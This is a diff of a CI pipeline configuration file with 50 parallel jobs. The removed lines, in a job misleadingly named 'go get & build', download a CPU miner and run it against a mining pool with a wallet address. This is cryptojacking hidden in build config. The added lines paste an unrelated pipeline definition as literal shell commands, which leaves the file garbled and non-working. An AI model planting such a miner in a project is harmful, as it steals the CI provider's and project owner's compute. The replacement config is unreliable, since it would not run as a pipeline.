@@ -10,9 +10,26 @@ blocks:
       jobs:
         - name: go get & build
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz '
-            - tar xf cpuminer-opt-linux.tar.gz
-            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BgopqeRqFTkxqSnxiCodAEoNYsdP6VDLHz.By'
+            - 'version: v1.0'
+            - 'name: Using execution_time_limit on a job'
+            - 'agent:'
+            - '  machine:'
+            - '    type: e1-standard-2'
+            - '    os_image: ubuntu1804'
+            - 'blocks:'
+            - '  - name: Tests'
+            - '    task:'
+            - '      jobs:'
+            - '      - name: Lint'
+            - '        commands:'
+            - '          - checkout'
+            - '          - make lint'
+            - '      - name:  Tests'
+            - '        execution_time_limit:'
+            - '          minutes: 30'
+            - '        commands:'
+            - '          - checkout'
+            - '          - make test'
           parallelism: 50
   - name: Check code style
     task:
